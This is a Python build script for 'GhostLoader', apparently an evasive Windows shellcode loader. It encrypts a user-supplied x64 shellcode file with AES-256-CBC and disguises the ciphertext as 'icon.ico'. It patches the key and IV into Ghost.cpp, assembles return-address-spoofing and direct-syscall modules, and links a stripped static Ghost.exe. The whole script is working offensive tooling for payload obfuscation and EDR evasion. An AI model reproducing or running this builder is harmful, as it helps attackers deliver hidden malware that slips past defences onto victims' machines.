# GhostLoader automated builder script
# THIS SCRIPT WILL NOT RUN ON WINDOWS

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os
import subprocess
import re
import argparse



parser = argparse.ArgumentParser()

parser.add_argument("--shellcode", "-i", help="a shellcode bin file to use with the loader (x64)", required=True)


args = parser.parse_args()

# CONSTANTS # (for possible future users, fix here what needed to be fixed)

SHELLCODE  = args.shellcode
CUR_DIR = os.getcwd()
CPP_SRC = f'{CUR_DIR}/Ghost.cpp'
WINDRES = "/usr/bin/x86_64-w64-mingw32-windres"
NASM = "/usr/bin/nasm"
MinGW = "/usr/bin/x86_64-w64-mingw32-g++"
MinGW_FLAGS = "-fmerge-all-constants -fexpensive-optimizations -finline-functions -fno-stack-protector -fno-unroll-loops -fno-exceptions -fno-rtti -Wpointer-arith  -fpermissive -w -static-libgcc -static-libstdc++"
MinGW_LINK_FLAGS = "-fmerge-all-constants -fexpensive-optimizations -finline-functions -flto -fno-stack-protector -fno-unroll-loops -fno-exceptions -fno-rtti -s -Wpointer-arith -fpermissive -Wl,--gc-sections -Wl,--strip-all -static-libgcc -static-libstdc++"
BUILD_DIR = f'{CUR_DIR}/build'

WIN_MAIN = "int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow);"

# ----------- #



def LOG_OUTPUT(string):
	print(f"[BUILD] {string}")


def generate_random_key(length):
    return get_random_bytes(length)

def print_byte_array(array, varname):
    array_str = ", ".join(f"0x{byte:02X}" for byte in array)
    print(f"unsigned char {varname}[] = {{ {array_str} }};")

def get_aes_formated_byte_array(_bytes):
	return ", ".join(f"0x{byte:02X}" for byte in _bytes)


def aes_encrypt(data):

	global AES_KEY, AES_IV

	key = generate_random_key(32)  # 256 bits
	iv = generate_random_key(16)   # 128 bits
    
	LOG_OUTPUT("generated AES key/iv")
	

	AES_KEY = F"unsigned char AesKey[] = {{ {get_aes_formated_byte_array(key)} }};"
	AES_IV = F"unsigned char AesIv[] = {{ {get_aes_formated_byte_array(iv)} }};"


	cipher = AES.new(key, AES.MODE_CBC, iv)
	encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    
	return encrypted_data, key, iv

def read_file(filepath):
    with open(filepath, 'rb') as file:
        return file.read()

def write_file(filepath, data):
    with open(filepath, 'wb') as file:
        file.write(data)


def do_aes(inputfile):

	data = read_file(inputfile)
	encrypted_data, key, iv = aes_encrypt(data)
	write_file("icon.ico", encrypted_data)

	LOG_OUTPUT("wrote encrypted shellcode to icon.ico")




def build_assembly():
	LOG_OUTPUT("Building assembly files")


	build_command_1 = f"{NASM} -f win64 {CUR_DIR}/retaddrspoof.asm -o {BUILD_DIR}/retaddrspoof.o"
	build_command_2 = f"{NASM} -f win64 {CUR_DIR}/syscalls.asm -o {BUILD_DIR}/syscalls.o"


	retaddrspoof_build = subprocess.run(build_command_1, shell=True, stdout=subprocess.DEVNULL,stderr=subprocess.PIPE, text=True)

	if (retaddrspoof_build.stderr):
		print("[ERROR] failed to build to retaddrspoof.asm to an object file")
		print(f"[i] command used: {build_command_1}")
		exit()


	syscalls_build = subprocess.run(build_command_2, shell=True, stdout=subprocess.DEVNULL,stderr=subprocess.PIPE, text=True)

	if (syscalls_build.stderr):
		print("[ERROR] failed to build to syscalls.asm to an object file")
		print(f"[i] command used: {build_command_2}")
		exit()


	LOG_OUTPUT("retaddrspoof.asm -> build/retaddrspoof.o")
	LOG_OUTPUT("syscalls.asm -> build/syscalls.o")



def build_resource():
	LOG_OUTPUT("Building resource file")

	build_command = f"{WINDRES} -i {CUR_DIR}/Resource.rc -o {BUILD_DIR}/Resource.o"

	resource_build =  subprocess.run(build_command, shell=True, stdout=subprocess.DEVNULL,stderr=subprocess.PIPE, text=True)

	if (resource_build.stderr):
		print("[ERROR] failed to build Resource.rc to res file")
		print(f"[i] command used: {build_command}")
		exit()


	LOG_OUTPUT("Resource.rc -> build/Resource.o")



def prepare_src_shellcode():

	do_aes(SHELLCODE)


	aes_key_pattern = re.compile(r'unsigned char AesKey\[\] = \{.*?\};')
	aes_iv_pattern = re.compile(r'unsigned char AesIv\[\] = \{.*?\};')


	with open(CPP_SRC, 'r') as file:
        	content = file.read()


	updated_src = aes_key_pattern.sub(AES_KEY, content)
	updated_src = aes_iv_pattern.sub(AES_IV, updated_src)

	with open(CPP_SRC, 'w') as file:
		file.write(updated_src)
	
	LOG_OUTPUT("Updated C++ src")




def build_cpp_src():
	LOG_OUTPUT("Building the C++ src")

	build_command = f"{MinGW} -c {CPP_SRC} {MinGW_FLAGS} -o {BUILD_DIR}/Ghost.o"
	object_build = subprocess.run(build_command, shell=True, stdout=subprocess.DEVNULL,stderr=subprocess.PIPE, text=True)

	if (object_build.stderr):
		print("[ERROR] failed to build Ghost.cpp to object file")
		print(f"[i] command used: {build_command}")
		exit()

	LOG_OUTPUT("Ghost.cpp -> build/Ghost.o")


def link():
	LOG_OUTPUT("Building the executable")

	link_command = f"{MinGW} {BUILD_DIR}/syscalls.o {BUILD_DIR}/retaddrspoof.o {BUILD_DIR}/Resource.o {BUILD_DIR}/Ghost.o {MinGW_LINK_FLAGS} -o {BUILD_DIR}/Ghost.exe"
	link = subprocess.run(link_command, shell=True, stdout=subprocess.DEVNULL,stderr=subprocess.PIPE, text=True)

	if (link.stderr):
		print("[ERROR] failed to build Ghost.cpp to object file")
		print(f"[i] command used: {link_command}")
		exit()

	LOG_OUTPUT("EXE -> build/Ghost.exe")



if __name__ == '__main__':
	build_assembly()
	prepare_src_shellcode()
	build_resource()
	build_cpp_src()
	link()